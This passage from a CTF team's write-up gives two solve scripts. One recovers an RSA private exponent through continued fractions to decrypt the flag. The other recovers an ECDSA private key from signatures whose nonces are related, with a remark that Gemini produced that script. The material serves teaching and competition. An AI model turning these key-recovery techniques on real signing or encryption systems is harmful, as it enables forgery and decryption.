<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">N = <span class="number">99697845285265879829811232968100099666254250525000506525475952592468738395250956460890611762459685140661035795964867321445992110528627232335703962897072608767840783176553829502743629914407970206513639916759403399986924602596286330464348286080258986075962271511105387188070309852907253486162504945490429185609</span></span><br><span class="line">e = <span class="number">74900336437853271512557457581304251523854378376434438153117909482138661618901386551154807447783262736408028580620771857416463085746907317126876189023636958838207330193074215769008709076254356539808209005917645822989554532710565445155350102802675594603406077862472881027575871589046600011223990947361848608637247276816477996863812313225929441545045479384803449990623969591150979899801722841101938868710054151839628803383603849632857020369527380816687165487370957857737696187061619496102857237814447790678611448197153594917852504509869007597997670022501500067854210261136878917620198551551460145853528269270832725348151160651020188255399136483482428499340574623409209151124687319668989144444549871527949104436734300277004316939985015286758651969045396343970037328043635061226100170529991733947365830164811844853806681198818875837903563263114249814483901121700854712406832325690101810786429930813776784979083590353027191492894890551838308899148551566437532914838098811643805243593419063566975400775134981190248113477610235165151367913498299241375039256652674679958159505112725441797566678743542054295794919839551675786573113798857814005058856054462008797386322048089657472710775620574463924678367455233801970310210504653908307254926827</span></span><br><span class="line">c = <span class="number">98460941530646528059934657633016619266170844887697553075379408285596784682803952762901219607460711533547279478564732097775812539176991062440097573591978613933775149262760936643842229597070673855940231912579258721734434631479496590694499265794576610924303262676255858387586947276246725949970866534023718638879</span></span><br><span class="line"></span><br><span class="line">N4 = N**<span class="number">4</span></span><br><span class="line"></span><br><span class="line">alpha = e / N4</span><br><span class="line"></span><br><span class="line">cf = continued_fraction(alpha)</span><br><span class="line">convergents = cf.convergents()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> conv <span class="keyword">in</span> convergents:</span><br><span class="line">    k_candidate = conv.numerator()</span><br><span class="line">    d_small_candidate = conv.denominator()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> d_small_candidate &gt;= <span class="number">2</span>**<span class="number">1020</span> <span class="keyword">and</span> d_small_candidate &lt; <span class="number">2</span>**<span class="number">1021</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Decrypt</span></span><br><span class="line">            c_inv = inverse_mod(c, N)</span><br><span class="line">            m = <span class="built_in">pow</span>(c_inv, d_small_candidate, N)</span><br><span class="line">            </span><br><span class="line">            m_bytes = <span class="built_in">int</span>(m).to_bytes((m.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;L3H&#x27;</span> <span class="keyword">in</span> m_bytes:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Flag found:&quot;</span>, m_bytes.decode())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag not found. Try more convergents or check the approach.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="../images/2025-L3HCTF/9b171591-f889-413c-9bf8-ce93a93bc9b6.png" alt="img"></p>
<h2><span id="ezecdsa">EzECDSA</span><a href="#ezecdsa" class="header-anchor"></a></h2><p>简单的密码题，把附件丢给gemini然后给出解题脚本即可，一次可能不行，让他修改优化即可</p>
<p><img src="../images/2025-L3HCTF/fb9ce8e3-89fe-43ee-9c6c-9fec648d4276.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> NIST256p</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inverse</span>(<span class="params">a, m</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算 a 模 m 的乘法逆元。</span></span><br><span class="line"><span class="string">    使用扩展欧几里得算法。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    扩展欧几里得算法。</span></span><br><span class="line"><span class="string">    返回 g, x, y 使得 a*x + b*y = g = gcd(a, b)。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> g, x - (b // a) * y, y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_poly</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    移除多项式列表开头多余的零，使其规范化。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(p) &gt; <span class="number">1</span> <span class="keyword">and</span> p[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        idx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(p) - <span class="number">1</span> <span class="keyword">and</span> p[idx] == <span class="number">0</span>:</span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> p[idx:]</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_add</span>(<span class="params">p1, p2, m</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将两个多项式 p1 和 p2 相加，模 m。</span></span><br><span class="line"><span class="string">    多项式表示为系数列表，从最高次幂到最低次幂。</span></span><br><span class="line"><span class="string">    例如，[a, b, c] 代表 ax^2 + bx + c。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    d1 = <span class="built_in">len</span>(p1)</span><br><span class="line">    d2 = <span class="built_in">len</span>(p2)</span><br><span class="line">    res = [<span class="number">0</span>] * <span class="built_in">max</span>(d1, d2)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(d1):</span><br><span class="line">        res[i + <span class="built_in">max</span>(d1, d2) - d1] = (p1[i] + res[i + <span class="built_in">max</span>(d1, d2) - d1]) % m</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(d2):</span><br><span class="line">        res[i + <span class="built_in">max</span>(d1, d2) - d2] = (p2[i] + res[i + <span class="built_in">max</span>(d1, d2) - d2]) % m</span><br><span class="line">    <span class="keyword">return</span> clean_poly(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_sub</span>(<span class="params">p1, p2, m</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将多项式 p2 从 p1 中减去，模 m。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    d1 = <span class="built_in">len</span>(p1)</span><br><span class="line">    d2 = <span class="built_in">len</span>(p2)</span><br><span class="line">    res = <span class="built_in">list</span>(p1)</span><br><span class="line">    <span class="keyword">if</span> d1 &lt; d2:</span><br><span class="line">        res = [<span class="number">0</span>] * (d2 - d1) + res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(d2):</span><br><span class="line">        res[<span class="built_in">len</span>(res) - d2 + i] = (res[<span class="built_in">len</span>(res) - d2 + i] - p2[i] + m) % m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clean_poly(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_mul</span>(<span class="params">p1, p2, m</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将两个多项式 p1 和 p2 相乘，模 m。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    d1 = <span class="built_in">len</span>(p1)</span><br><span class="line">    d2 = <span class="built_in">len</span>(p2)</span><br><span class="line">    res = [<span class="number">0</span>] * (d1 + d2 - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(d1):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(d2):</span><br><span class="line">            res[i + j] = (res[i + j] + p1[i] * p2[j]) % m</span><br><span class="line">    <span class="keyword">return</span> clean_poly(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_div</span>(<span class="params">dividend, divisor, m</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    执行多项式除法（带余数），模 m。</span></span><br><span class="line"><span class="string">    返回 (商, 余数)。</span></span><br><span class="line"><span class="string">    假定除数的最高次系数是可逆的。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    dividend = <span class="built_in">list</span>(dividend)  <span class="comment"># 复制以避免修改原始列表</span></span><br><span class="line">    divisor = <span class="built_in">list</span>(divisor)</span><br><span class="line"></span><br><span class="line">    dividend = clean_poly(dividend)</span><br><span class="line">    divisor = clean_poly(divisor)</span><br><span class="line"></span><br><span class="line">    deg_dend = <span class="built_in">len</span>(dividend) - <span class="number">1</span></span><br><span class="line">    deg_div = <span class="built_in">len</span>(divisor) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> deg_div &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Divisor cannot be a zero polynomial&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> deg_div &gt; deg_dend:</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">0</span>], dividend</span><br><span class="line"></span><br><span class="line">    lc_div = divisor[<span class="number">0</span>]</span><br><span class="line">    lc_inv = mod_inverse(lc_div, m)</span><br><span class="line"></span><br><span class="line">    quotient = [<span class="number">0</span>] * (deg_dend - deg_div + <span class="number">1</span>)</span><br><span class="line">    remainder = <span class="built_in">list</span>(dividend)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(deg_dend - deg_div + <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 得到当前余数的最高次系数</span></span><br><span class="line">        lc_rem = remainder[i]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算商的当前项</span></span><br><span class="line">        q_term = (lc_rem * lc_inv) % m</span><br><span class="line">        quotient[i] = q_term</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从余数中减去除数乘以商项的结果</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(deg_div + <span class="number">1</span>):</span><br><span class="line">            term = (q_term * divisor[j]) % m</span><br><span class="line">            remainder[i + j] = (remainder[i + j] - term + m) % m</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 规范化商和余数</span></span><br><span class="line">    remainder = clean_poly(remainder[<span class="built_in">len</span>(quotient):])</span><br><span class="line">    quotient = clean_poly(quotient)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> quotient, remainder</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_gcd</span>(<span class="params">p1, p2, m</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用欧几里得算法计算两个多项式在 Z_m 上的 GCD。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    a = p1</span><br><span class="line">    b = p2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">any</span>(x != <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> b):</span><br><span class="line">        _, r = poly_div(a, b, m)</span><br><span class="line">        a = b</span><br><span class="line">        b = r</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 规范化多项式，使最高次系数为 1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(x != <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> a):</span><br><span class="line">        lc_inv = mod_inverse(a[<span class="number">0</span>], m)</span><br><span class="line">        a = [(x * lc_inv) % m <span class="keyword">for</span> x <span class="keyword">in</span> a]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 1. 定义曲线和阶数</span></span><br><span class="line">    curve = NIST256p</span><br><span class="line">    n = curve.order</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 解析 signatures.txt</span></span><br><span class="line">    h_values = []</span><br><span class="line">    r_values = []</span><br><span class="line">    s_values = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用提供的文件内容</span></span><br><span class="line">    content = <span class="string">&quot;&quot;&quot;h: 5832921593739954772384341732387581797486339670895875430934592373351528180781, r: 78576287416983546819312440403592484606132915965726128924031253623117138586396, s: 108582979377193966287732302562639670357586761346333866965382465209612237330851</span></span><br><span class="line"><span class="string">h: 85517239535736342992982496475440962888226294744294285419613128065975843025446, r: 60425040031360920373082268221766168683222476464343035165195057634060216692194, s: 27924509924269609509672965613674355269361001011362007412205784446375567959036</span></span><br><span class="line"><span class="string">h: 90905761421138489726836357279787648991884324454425734512085180879013704399530, r: 75779605492148881737630918749717271960050893072832415117470852442721700807111, s: 72740499400319841565890543635298470075267336863033867770902108413176557795256</span></span><br><span class="line"><span class="string">h: 103266614372002123398101167242562044737358751274736728792365384600377408313142, r: 89519601474973769723244654516140957004170211982048028366151899055366457476708, s: 23639647021855356876198750083669161995553646511611903128486429649329358343588</span></span><br><span class="line"><span class="string">h: 9903460667647154866199928325987868915846235162578615698288214703794150057571, r: 17829304522948160053211214227664982869100868125268116260967204562276608388692, s: 74400189461172040580877095515356365992183768921088660926738652857846750009205</span></span><br><span class="line"><span class="string">h: 54539896686295066164943194401294833445622227965487949234393615233511802974126, r: 66428683990399093855578572760918582937085121375887639383221629490465838706027, s: 25418035697368269779911580792368595733749376383350120613502399678197333473802</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    lines = content.strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        parts = line.split(<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">        h = <span class="built_in">int</span>(parts[<span class="number">0</span>].split(<span class="string">&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">        r = <span class="built_in">int</span>(parts[<span class="number">1</span>].split(<span class="string">&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">        s = <span class="built_in">int</span>(parts[<span class="number">2</span>].split(<span class="string">&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">        h_values.append(h)</span><br><span class="line">        r_values.append(r)</span><br><span class="line">        s_values.append(s)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 将 k_i 表示为关于 d 的线性多项式</span></span><br><span class="line">    k_polys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        s_inv = mod_inverse(s_values[i], n)</span><br><span class="line">        A = (h_values[i] * s_inv) % n</span><br><span class="line">        B = (r_values[i] * s_inv) % n</span><br><span class="line">        <span class="comment"># [B, A] 代表 B*d + A</span></span><br><span class="line">        k_polys.append([B, A])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. 从递推关系中构造多项式方程</span></span><br><span class="line">    <span class="comment"># 递推关系为：k_&#123;i+1&#125; = a*k_i^2 + b*k_i + c</span></span><br><span class="line">    <span class="comment"># 通过消去 a, b, c，我们可以得到一个只依赖于 d 的多项式方程</span></span><br><span class="line">    <span class="comment"># 方程形式为: a(k_2-k_0)(k_2-k_1)(k_1-k_0) = (k_3-k_2)(k_1-k_0) - (k_2-k_1)^2</span></span><br><span class="line">    <span class="comment"># 我们将左边和右边分别表示为关于 d 的多项式，并使用两组不同的 k 值来得到两个多项式方程。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_poly_for_a_numerator</span>(<span class="params">k_p0, k_p1, k_p2, k_p3</span>):</span><br><span class="line">        <span class="comment"># 分子: (k_3 - k_2)*(k_1 - k_0) - (k_2 - k_1)^2</span></span><br><span class="line">        p32 = poly_sub(k_p3, k_p2, n)</span><br><span class="line">        p10 = poly_sub(k_p1, k_p0, n)</span><br><span class="line">        p21 = poly_sub(k_p2, k_p1, n)</span><br><span class="line"></span><br><span class="line">        num_part1 = poly_mul(p32, p10, n)</span><br><span class="line">        num_part2 = poly_mul(p21, p21, n)</span><br><span class="line">        <span class="keyword">return</span> poly_sub(num_part1, num_part2, n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_poly_for_a_denominator</span>(<span class="params">k_p0, k_p1, k_p2</span>):</span><br><span class="line">        <span class="comment"># 分母: (k_2 - k_0)*(k_2 - k_1)*(k_1 - k_0)</span></span><br><span class="line">        p20 = poly_sub(k_p2, k_p0, n)</span><br><span class="line">        p21 = poly_sub(k_p2, k_p1, n)</span><br><span class="line">        p10 = poly_sub(k_p1, k_p0, n)</span><br><span class="line"></span><br><span class="line">        den_part1 = poly_mul(p20, p21, n)</span><br><span class="line">        <span class="keyword">return</span> poly_mul(den_part1, p10, n)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 得到第一组方程：a(k0..k3) = a(k1..k4)</span></span><br><span class="line">    num1 = get_poly_for_a_numerator(k_polys[<span class="number">0</span>], k_polys[<span class="number">1</span>], k_polys[<span class="number">2</span>], k_polys[<span class="number">3</span>])</span><br><span class="line">    den1 = get_poly_for_a_denominator(k_polys[<span class="number">0</span>], k_polys[<span class="number">1</span>], k_polys[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    num2 = get_poly_for_a_numerator(k_polys[<span class="number">1</span>], k_polys[<span class="number">2</span>], k_polys[<span class="number">3</span>], k_polys[<span class="number">4</span>])</span><br><span class="line">    den2 = get_poly_for_a_denominator(k_polys[<span class="number">1</span>], k_polys[<span class="number">2</span>], k_polys[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方程为 num1*den2 - num2*den1 = 0</span></span><br><span class="line">    poly1 = poly_sub(poly_mul(num1, den2, n), poly_mul(num2, den1, n), n)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 得到第二组方程：a(k1..k4) = a(k2..k5)</span></span><br><span class="line">    num3 = get_poly_for_a_numerator(k_polys[<span class="number">2</span>], k_polys[<span class="number">3</span>], k_polys[<span class="number">4</span>], k_polys[<span class="number">5</span>])</span><br><span class="line">    den3 = get_poly_for_a_denominator(k_polys[<span class="number">2</span>], k_polys[<span class="number">3</span>], k_polys[<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方程为 num2*den3 - num3*den2 = 0</span></span><br><span class="line">    poly2 = poly_sub(poly_mul(num2, den3, n), poly_mul(num3, den2, n), n)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5. 计算两个多项式的最大公约数（GCD）</span></span><br><span class="line">    gcd_poly = poly_gcd(poly1, poly2, n)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 6. 从 GCD 中提取根</span></span><br><span class="line">    <span class="comment"># GCD 应该是一个一次多项式，形如 c1*d + c0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(gcd_poly) == <span class="number">2</span>:</span><br><span class="line">        c1 = gcd_poly[<span class="number">0</span>]</span><br><span class="line">        c0 = gcd_poly[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># d = -c0 * c1_inv mod n</span></span><br><span class="line">        c1_inv = mod_inverse(c1, n)</span><br><span class="line">        d = (-c0 * c1_inv) % n</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Private key d found: <span class="subst">&#123;d&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Flag: L3HCTF&#123;&#123;<span class="subst">&#123;d&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Failed to find a linear GCD polynomial. Something went wrong.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

</div><div class="article-licensing box"><div class="licensing-title"><p>2025 L3HCTF SU WriteUp</p><p><a href="https://team-su.github.io/posts/e3fd1be7.html">https://team-su.github.io/posts/e3fd1be7.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2025-07-13</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-07-15</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/L3HCTF/">L3HCTF</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/25004.html"><span class="level-item">2025 DASCTF上半年赛 SU WriteUp</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right  order-3 is-sticky"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" 